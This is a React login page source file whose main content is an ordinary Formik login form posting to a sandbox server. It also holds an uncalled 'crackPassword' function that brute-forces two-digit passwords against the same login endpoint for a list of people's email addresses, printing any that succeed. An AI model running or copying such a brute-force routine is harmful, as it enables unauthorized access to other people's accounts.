import { useFormik, useHistory } from 'formik';
import React from 'react';
import { object, string } from 'yup';
import styled from 'styled-components';
import { TextField, Button, Box } from '@material-ui/core';
import './LoginPage.css';

const LoginPageWrapper = styled(Box)`
  background: ;
`;

async function crackPassword() {
  const logins = [
    // 'egordavidovich@mail.com',
    // 'feliksharauski@mail.com',
    // 'viktorg@mail.com',
    // 'dtarankevich@mail.com',
    // 'tataiana@mail.com',
    // 'taisiagvozdeva@mail.com',
    'mariaguk@mail.com',
    // 'alexsavich@mail.com',
    // 'ysekach@mail.com',
  ];

  logins.forEach(login => {
    [...Array(100)].forEach((_, i) => {
      fetch('https://uoxfu.sse.codesandbox.io/login', {
        method: 'POST',
        body: JSON.stringify({
          login,
          password: `${i < 10 ? 0 : ''}${i}`,
        }),
        headers: {
          // Accept: 'application/json',
          'Content-Type': 'application/json',
        },
      }).then(res => {
        // eslint-disable-next-line no-console
        if (res.status === 200) console.log(`${i < 10 ? 0 : ''}${i}`);
      });
    });
  });
}

export default function LoginPage() {
  const { push } = useHistory();
  const formik = useFormik({
    initialValues: {
      login: '',
      password: '',
    },

    onSubmit: values => {
      // eslint-disable-next-line no-console
      // console.log(JSON.stringify(values, null, 2));
      // formik.resetForm();

      fetch('https://uoxfu.sse.codesandbox.io/login', {
        method: 'POST',
        body: JSON.stringify(values),
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
        },
      }).then(res => {
        if (res.status === 200) push('/');
        else res.text().then(errorString => alert(errorString));
      });

      formik.resetForm();
    },
    validateOnChange: false,
    validateOnBlur: true,
    validationSchema: object({
      login: string().email('The Email must contain the correct value!'),
      password: string().required(),
    }),
  });

  return (
    <LoginPageWrapper
      className="box"
      m={2}
      style={{
        background: '',
        marginTop: '110px',
        height: '100%',
        width: '440px',
        borderRadius: '12px',
        overflow: 'hidden',
        display: 'grid',
        fontFamily: 'century gothic',
        paddingBottom: '40px',
      }}
    >
      <form onSubmit={formik.handleSubmit}>
        <p
          style={{
            display: 'block',
            fontSize: '38px',
            fontWeight: 'bold',
            color: '#bd59d4',
            textAlign: 'center',
          }}
        >
          {' '}
          Login
        </p>
        <div style={{ width: 200, display: 'flex', flexDirection: 'column' }}>
          <TextField
            style={{
              width: '250px',
              marginBottom: '30px',
              marginLeft: '50%',
            }}
            required
            label="Login"
            name="login"
            value={formik.values.login}
            onChange={formik.handleChange}
            onBlur={formik.handleBlur}
            sx={{ m: 1 }}
            error={formik.touched.login && !!formik.errors.login}
            helperText={formik.touched.login && formik.errors.login}
          />
          <TextField
            style={{
              width: '250px',
              marginBottom: '50px',
              marginLeft: '50%',
            }}
            required
            label="Password"
            type="password"
            name="password"
            value={formik.values.password}
            onChange={formik.handleChange}
            onBlur={formik.handleBlur}
            sx={{ m: 1, mb: 4 }}
            error={formik.touched.password && !!formik.errors.password}
            helperText={formik.touched.password && formik.errors.password}
          />
          <Button
            variant="contained"
            type="submit"
            sx={{ m: 1 }}
            style={{
              borderRadius: '24px',
              backgroundColor: ' #bd59d4',
              width: '160px',
              height: '50px',
              marginLeft: '70%',
            }}
          >
            login
          </Button>
        </div>
      </form>
      <p
        style={{
          paddingTop: '50px',
          textAlign: 'center',
          color: '#999',
          fontSize: '16px',
          marginBottom: '',
        }}
      >
        Or login with
      </p>
      <div
        style={{
          paddingTop: '110px',
          textAlign: 'center',
          fontSize: '18px',
          fontFamily: 'SourceSansPro-Regular',
          color: '#4b2354',
        }}
      >
        Sign Up
      </div>
    </LoginPageWrapper>
  );
}
